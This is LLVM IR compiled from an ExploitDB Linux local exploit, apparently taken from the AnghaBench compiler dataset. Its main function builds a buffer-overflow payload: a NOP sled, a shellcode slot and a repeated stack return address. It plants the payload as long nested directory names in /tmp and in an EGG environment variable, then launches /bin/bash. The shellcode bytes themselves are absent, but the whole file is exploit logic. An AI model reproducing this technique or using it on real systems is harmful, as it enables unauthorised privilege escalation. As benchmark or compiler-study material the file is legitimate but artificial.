; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20927.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20927.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [5 x i8] c"/tmp\00", align 1
@.str.1 = private unnamed_addr constant [21 x i8] c"Using addr = 0x%08x\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [11 x i8] c"mkdir \22%s\22\00", align 1
@shellpath = common dso_local global i8* null, align 8
@shellprog = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [17 x i8] c"strlen(path)=%d\0A\00", align 1
@.str.4 = private unnamed_addr constant [15 x i8] c"ADDRESS: 0x%x\0A\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"EGG\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [4096 x i8], align 16
  %9 = alloca [4096 x i8], align 16
  %10 = alloca [4096 x i8], align 16
  %11 = alloca [4096 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 3221222416, i64* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = icmp sgt i32 %16, 1
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @atoi(i8* %21)
  store i32 %22, i32* %14, align 4
  br label %24

23:                                               ; preds = %2
  store i32 0, i32* %14, align 4
  br label %24

24:                                               ; preds = %23, %18
  %25 = call i32 @chdir(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %26 = load i32, i32* %14, align 4
  %27 = sext i32 %26 to i64
  %28 = load i64, i64* %15, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %15, align 8
  %30 = load i64, i64* %15, align 8
  %31 = trunc i64 %30 to i32
  %32 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), i32 %31)
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %33, i8** %6, align 8
  store i32 0, i32* %12, align 4
  br label %34

34:                                               ; preds = %43, %24
  %35 = load i32, i32* %12, align 4
  %36 = load i8*, i8** @shellcode, align 8
  %37 = call i32 @strlen(i8* %36)
  %38 = sub nsw i32 162, %37
  %39 = icmp slt i32 %35, %38
  br i1 %39, label %40, label %46

40:                                               ; preds = %34
  %41 = load i8*, i8** %6, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %6, align 8
  store i8 -112, i8* %41, align 1
  br label %43

43:                                               ; preds = %40
  %44 = load i32, i32* %12, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %12, align 4
  br label %34

46:                                               ; preds = %34
  %47 = load i8*, i8** @shellcode, align 8
  store i8* %47, i8** %7, align 8
  store i32 0, i32* %12, align 4
  br label %48

48:                                               ; preds = %59, %46
  %49 = load i32, i32* %12, align 4
  %50 = load i8*, i8** @shellcode, align 8
  %51 = call i32 @strlen(i8* %50)
  %52 = icmp slt i32 %49, %51
  br i1 %52, label %53, label %62

53:                                               ; preds = %48
  %54 = load i8*, i8** %7, align 8
  %55 = getelementptr inbounds i8, i8* %54, i32 1
  store i8* %55, i8** %7, align 8
  %56 = load i8, i8* %54, align 1
  %57 = load i8*, i8** %6, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %6, align 8
  store i8 %56, i8* %57, align 1
  br label %59

59:                                               ; preds = %53
  %60 = load i32, i32* %12, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %12, align 4
  br label %48

62:                                               ; preds = %48
  %63 = load i8*, i8** %6, align 8
  store i8 0, i8* %63, align 1
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %65 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %66 = call i32 @strcpy(i8* %64, i8* %65)
  %67 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %69 = call i32 @sprintf(i8* %67, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8* %68)
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %71 = call i32 @system(i8* %70)
  store i32 0, i32* %12, align 4
  br label %72

72:                                               ; preds = %85, %62
  %73 = load i32, i32* %12, align 4
  %74 = load i8*, i8** @shellpath, align 8
  %75 = call i32 @strlen(i8* %74)
  %76 = icmp slt i32 %73, %75
  br i1 %76, label %77, label %88

77:                                               ; preds = %72
  %78 = load i8*, i8** @shellpath, align 8
  %79 = load i32, i32* %12, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i8, i8* %81, align 1
  %83 = load i8*, i8** %6, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %6, align 8
  store i8 %82, i8* %83, align 1
  br label %85

85:                                               ; preds = %77
  %86 = load i32, i32* %12, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %12, align 4
  br label %72

88:                                               ; preds = %72
  %89 = load i8*, i8** %6, align 8
  store i8 0, i8* %89, align 1
  %90 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %91 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %92 = call i32 @sprintf(i8* %90, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8* %91)
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %94 = call i32 @system(i8* %93)
  store i32 0, i32* %12, align 4
  br label %95

95:                                               ; preds = %108, %88
  %96 = load i32, i32* %12, align 4
  %97 = load i8*, i8** @shellprog, align 8
  %98 = call i32 @strlen(i8* %97)
  %99 = icmp slt i32 %96, %98
  br i1 %99, label %100, label %111

100:                                              ; preds = %95
  %101 = load i8*, i8** @shellprog, align 8
  %102 = load i32, i32* %12, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = load i8, i8* %104, align 1
  %106 = load i8*, i8** %6, align 8
  %107 = getelementptr inbounds i8, i8* %106, i32 1
  store i8* %107, i8** %6, align 8
  store i8 %105, i8* %106, align 1
  br label %108

108:                                              ; preds = %100
  %109 = load i32, i32* %12, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %12, align 4
  br label %95

111:                                              ; preds = %95
  %112 = load i8*, i8** %6, align 8
  store i8 0, i8* %112, align 1
  %113 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %114 = call i32 @strlen(i8* %113)
  %115 = call i32 @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0), i32 %114)
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %117 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %118 = call i32 @sprintf(i8* %116, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8* %117)
  %119 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %120 = call i32 @system(i8* %119)
  store i32 0, i32* %12, align 4
  br label %121

121:                                              ; preds = %156, %111
  %122 = load i32, i32* %12, align 4
  %123 = icmp slt i32 %122, 172
  br i1 %123, label %124, label %159

124:                                              ; preds = %121
  %125 = load i64, i64* %15, align 8
  %126 = lshr i64 %125, 16
  %127 = trunc i64 %126 to i8
  %128 = sext i8 %127 to i32
  %129 = and i32 %128, 255
  %130 = trunc i32 %129 to i8
  %131 = load i8*, i8** %6, align 8
  %132 = getelementptr inbounds i8, i8* %131, i32 1
  store i8* %132, i8** %6, align 8
  store i8 %130, i8* %131, align 1
  %133 = load i64, i64* %15, align 8
  %134 = lshr i64 %133, 24
  %135 = trunc i64 %134 to i8
  %136 = sext i8 %135 to i32
  %137 = and i32 %136, 255
  %138 = trunc i32 %137 to i8
  %139 = load i8*, i8** %6, align 8
  %140 = getelementptr inbounds i8, i8* %139, i32 1
  store i8* %140, i8** %6, align 8
  store i8 %138, i8* %139, align 1
  %141 = load i64, i64* %15, align 8
  %142 = trunc i64 %141 to i8
  %143 = sext i8 %142 to i32
  %144 = and i32 %143, 255
  %145 = trunc i32 %144 to i8
  %146 = load i8*, i8** %6, align 8
  %147 = getelementptr inbounds i8, i8* %146, i32 1
  store i8* %147, i8** %6, align 8
  store i8 %145, i8* %146, align 1
  %148 = load i64, i64* %15, align 8
  %149 = lshr i64 %148, 8
  %150 = trunc i64 %149 to i8
  %151 = sext i8 %150 to i32
  %152 = and i32 %151, 255
  %153 = trunc i32 %152 to i8
  %154 = load i8*, i8** %6, align 8
  %155 = getelementptr inbounds i8, i8* %154, i32 1
  store i8* %155, i8** %6, align 8
  store i8 %153, i8* %154, align 1
  br label %156

156:                                              ; preds = %124
  %157 = load i32, i32* %12, align 4
  %158 = add nsw i32 %157, 1
  store i32 %158, i32* %12, align 4
  br label %121

159:                                              ; preds = %121
  %160 = load i8*, i8** %6, align 8
  %161 = getelementptr inbounds i8, i8* %160, i64 -4
  %162 = load i8, i8* %161, align 1
  %163 = sext i8 %162 to i64
  store i64 %163, i64* %15, align 8
  %164 = load i64, i64* %15, align 8
  %165 = trunc i64 %164 to i32
  %166 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0), i32 %165)
  %167 = load i8*, i8** %6, align 8
  store i8 0, i8* %167, align 1
  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %169 = call i32 @strlen(i8* %168)
  %170 = call i32 @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0), i32 %169)
  %171 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %172 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %173 = call i32 @sprintf(i8* %171, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8* %172)
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 0
  %175 = call i32 @system(i8* %174)
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %177 = call i32 @setenv(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0), i8* %176, i32 1)
  %178 = call i32 @system(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %179 = load i32, i32* %3, align 4
  ret i32 %179
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
